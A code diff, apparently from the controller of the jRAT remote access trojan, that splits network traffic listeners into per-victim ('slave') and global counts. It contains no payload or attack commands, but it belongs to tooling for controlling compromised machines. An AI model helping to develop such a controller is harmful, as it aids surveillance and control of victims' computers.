@@ -5,11 +5,13 @@ import java.util.List;
 
 import se.jrat.client.AbstractSlave;
 import se.jrat.client.Main;
+import se.jrat.client.listeners.GlobalNetworkMonitorListener;
 import se.jrat.client.listeners.NetworkMonitorListener;
 
 public class RunnableNetworkCounter implements Runnable {
 	
-	private static final List<NetworkMonitorListener> listeners = new ArrayList<NetworkMonitorListener>();
+	private static final List<NetworkMonitorListener> INVIDUAL_LISTENERS = new ArrayList<NetworkMonitorListener>();
+	private static final List<GlobalNetworkMonitorListener> GLOBAL_LISTENERS = new ArrayList<GlobalNetworkMonitorListener>();
 	
 	@Override
 	public void run() {
@@ -21,11 +23,17 @@ public class RunnableNetworkCounter implements Runnable {
 				int out = 0;
 				
 				for (AbstractSlave slave : Main.connections) {
-					in += slave.getCountingInputStream().getCount();
-					out += slave.getCountingOutputStream().getCount();
+					int sin = (int) slave.getCountingInputStream().getCount();
+					int sout = (int) slave.getCountingOutputStream().getCount();
+					in += sin;
+					out += sout;
+					
+					for (NetworkMonitorListener listener : INVIDUAL_LISTENERS) {
+						listener.onUpdate(slave, sin, sout);
+					}
 				}
 				
-				for (NetworkMonitorListener listener : listeners) {
+				for (GlobalNetworkMonitorListener listener : GLOBAL_LISTENERS) {
 					listener.onUpdate(in, out);
 				}
 							
@@ -38,12 +46,21 @@ public class RunnableNetworkCounter implements Runnable {
 			ex.printStackTrace();
 		}
 	}
+	
+	public static void addGlobalListener(GlobalNetworkMonitorListener listener) {
+		GLOBAL_LISTENERS.add(listener);
+	}
+	
+	public static void removeGlobalListener(GlobalNetworkMonitorListener listener) {
+		GLOBAL_LISTENERS.remove(listener);
+	}
 
 	public static void addListener(NetworkMonitorListener listener) {
-		listeners.add(listener);
+		INVIDUAL_LISTENERS.add(listener);
 	}
 	
 	public static void removeListener(NetworkMonitorListener listener) {
-		listeners.remove(listener);
+		INVIDUAL_LISTENERS.remove(listener);
 	}
 }
+
